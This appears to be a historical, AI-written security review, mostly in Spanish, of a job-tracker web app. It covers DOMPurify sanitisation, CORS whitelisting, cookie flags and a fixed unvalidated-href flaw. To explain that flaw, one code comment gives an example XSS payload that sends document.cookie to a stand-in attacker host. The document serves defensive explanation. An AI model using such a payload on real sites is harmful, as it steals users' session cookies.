> **Note:** This document is a historical security review from an early branch (`docs-security-documentation`). The architecture has evolved significantly since then — the PHP backend is now a framework (`api/index.php` with `OverPHP\Core\Router`) rather than individual script files, and state management uses Zustand instead of direct localStorage. For current security practices, see `DOCS/SECURITY.md`.

# Revisión de Seguridad - Branch docs-security-documentation

## Fecha: $(date)
## Revisado por: Auto (AI Assistant)

---

## 📋 Resumen de Cambios de Seguridad Implementados

En esta branch se implementaron las siguientes medidas de seguridad:

### 1. **Protección contra Cross-Site Scripting (XSS)**

#### Implementado en:
- **Frontend (`src/utils/localStorage.ts`)**:
  - Función `sanitizeObject()` que sanitiza recursivamente todos los campos string usando `DOMPurify`
  - Sanitización automática al cargar datos de `localStorage` en `getApplications()` y `getOpportunities()`
  - Sanitización antes de guardar en `saveApplications()` y `saveOpportunities()`

- **Frontend (`src/components/ApplicationTable.tsx`)**:
  - Sanitización adicional antes de renderizar con `dangerouslySetInnerHTML` usando `DOMPurify.sanitize()`
  - Enfoque de defensa en profundidad (defense-in-depth)

- **Backend (API PHP)**:
  - Uso de `htmlspecialchars()` para sanitizar todos los datos de entrada
  - Implementado en `api/google-sheets.php`, `api/set-auth-cookie.php`, `api/get-auth-cookie.php`

#### ✅ Estado: **Correctamente implementado**

### 2. **Protección contra Ataques de Inyección**

#### Implementado en:
- **Backend (`api/google-sheets.php`)**:
  - Función `sanitize_input()` que sanitiza recursivamente todos los datos recibidos
  - Validación del formato de `spreadsheetId` usando expresiones regulares: `/^[a-zA-Z0-9\-\_]+$/`
  - Validación de tipos y tamaños de datos antes de procesarlos

#### ✅ Estado: **Correctamente implementado**

### 3. **Política CORS Restrictiva**

#### Implementado en:
- **Todos los archivos PHP en `api/`**:
  - Lista blanca de orígenes permitidos: `['http://localhost:5173', 'https://jajat.godieboy.com']`
  - Rechazo explícito de orígenes no autorizados (HTTP 403 en preflight)
  - Uso de `Access-Control-Allow-Credentials: true` solo para orígenes permitidos
  - Header `Vary: Origin` para evitar problemas de caché

#### Archivos modificados:
- `api/clear-auth-cookie.php`
- `api/get-auth-cookie.php`
- `api/google-sheets.php`
- `api/set-auth-cookie.php`

#### ✅ Estado: **Correctamente implementado**

### 4. **Seguridad de Cookies**

#### Implementado en:
- **Cookies HTTP-only**: Previene acceso desde JavaScript (protección XSS)
- **Cookies Secure**: Solo se envían sobre HTTPS en producción
- **SameSite=Strict**: Protección contra CSRF
- Validación del formato de tokens

#### ✅ Estado: **Correctamente implementado**

---

## 🔍 Vulnerabilidades Encontradas y Corregidas

### ⚠️ VULNERABILIDAD CRÍTICA: URLs No Validadas en Atributos `href`

#### Problema Detectado:
- **Ubicación**: `src/components/ApplicationTable.tsx` (línea 90)
- **Ubicación**: `src/pages/OpportunitiesPage.tsx` (línea 248)

#### Descripción:
Los atributos `href` se estaban configurando directamente con contenido del usuario sin validar el esquema de URL. Esto podría permitir:
- URLs `javascript:` que ejecuten código malicioso
- URLs `data:` que podrían exponer información sensible
- Otras URLs peligrosas

#### Ejemplo de ataque potencial:
```javascript
// Si un usuario guarda esto como "link":
// javascript:alert(document.cookie)
// O peor: javascript:fetch('https://attacker.com/steal?cookie='+document.cookie)
```

#### Solución Implementada:
1. **Creación de función `sanitizeUrl()`** en `src/utils/localStorage.ts`:
   - Valida que la URL tenga un esquema permitido (`http:`, `https:`, `mailto:`, `tel:`)
   - Rechaza esquemas peligrosos (`javascript:`, `data:`, `vbscript:`, etc.)
   - Maneja URLs relativas de forma segura
   - Retorna `#` para URLs inválidas o peligrosas

2. **Aplicación de la validación**:
   - `ApplicationTable.tsx`: Ahora usa `sanitizeUrl(cellContent)` antes de asignar a `href`
   - `OpportunitiesPage.tsx`: Ahora usa `sanitizeUrl(opp.link)` antes de asignar a `href`

#### ✅ Estado: **CORREGIDO**

---

## 📊 Análisis de Archivos TSX

### Archivos Revisados: 31 archivos TSX

### ✅ Componentes Seguros:

1. **`src/components/ApplicationTable.tsx`**
   - ✅ Usa DOMPurify para sanitizar antes de `dangerouslySetInnerHTML`
   - ✅ Ahora valida URLs antes de usar en `href` (CORREGIDO)

2. **`src/components/KanbanView.tsx`**
   - ✅ Renderiza datos usando JSX normal (React escapa automáticamente)
   - ✅ Los datos provienen de `localStorage` que está sanitizado

3. **`src/components/TimelineView.tsx`**
   - ✅ Renderiza datos usando JSX normal (React escapa automáticamente)
   - ✅ Los datos provienen de `localStorage` que está sanitizado

4. **`src/components/ConfirmDialog.tsx`**
   - ✅ Prop `message` se renderiza como texto (no HTML)
   - ✅ React escapa automáticamente el contenido

5. **`src/components/Alert.tsx`**
   - ✅ Prop `message` se renderiza como texto (no HTML)
   - ✅ React escapa automáticamente el contenido

6. **`src/components/AddJobComponent.tsx`**
   - ✅ Formularios controlados que pasan por validación y sanitización antes de guardar

7. **`src/components/OpportunityForm.tsx`**
   - ✅ Validación de URL con `new URL()` antes de guardar
   - ✅ Inputs controlados

8. **`src/pages/OpportunitiesPage.tsx`**
   - ✅ Ahora valida URLs antes de usar en `href` (CORREGIDO)

### ⚠️ Consideraciones:

1. **`dangerouslySetInnerHTML` en ApplicationTable.tsx**:
   - ⚠️ Se usa `dangerouslySetInnerHTML`, pero está correctamente sanitizado con DOMPurify
   - ✅ Buen enfoque de defensa en profundidad (sanitización en múltiples capas)
   - 💡 **Recomendación**: Considerar usar renderizado normal de React cuando sea posible, ya que React escapa automáticamente

2. **Renderizado de datos de usuario**:
   - ✅ La mayoría de componentes renderizan datos usando JSX normal (`{variable}`)
   - ✅ React escapa automáticamente el contenido, lo cual es seguro
   - ✅ Los datos provienen de `localStorage` que está sanitizado antes de guardar y cargar

---

## ✅ Resumen Final

### Medidas de Seguridad Implementadas:
1. ✅ **XSS Protection**: DOMPurify en frontend + htmlspecialchars en backend
2. ✅ **Injection Protection**: Sanitización y validación en backend
3. ✅ **CORS Protection**: Política restrictiva con lista blanca
4. ✅ **Cookie Security**: HTTP-only, Secure, SameSite=Strict
5. ✅ **URL Validation**: Función `sanitizeUrl()` para prevenir URLs peligrosas

### Vulnerabilidades Corregidas:
1. ✅ **URLs no validadas en `href`**: Implementada función `sanitizeUrl()` y aplicada en componentes afectados

### Estado General:
**✅ SEGURO** - Todas las vulnerabilidades identificadas han sido corregidas. Las medidas de seguridad implementadas son sólidas y siguen las mejores prácticas.

---

## 📝 Recomendaciones Adicionales (Opcionales)

1. **Content Security Policy (CSP)**:
   - Considerar implementar headers CSP para protección adicional contra XSS

2. **Rate Limiting**:
   - Considerar implementar rate limiting en la API PHP para prevenir abuso

3. **Validación en Frontend**:
   - La validación de URL en `OpportunityForm.tsx` es buena, pero podría mejorarse para rechazar esquemas peligrosos desde el inicio

4. **Auditorías Regulares**:
   - Realizar auditorías de seguridad periódicas, especialmente al agregar nuevas funcionalidades

5. **Testing de Seguridad**:
   - Considerar agregar tests automatizados para validar las medidas de seguridad

---

**Revisión completada exitosamente** ✨
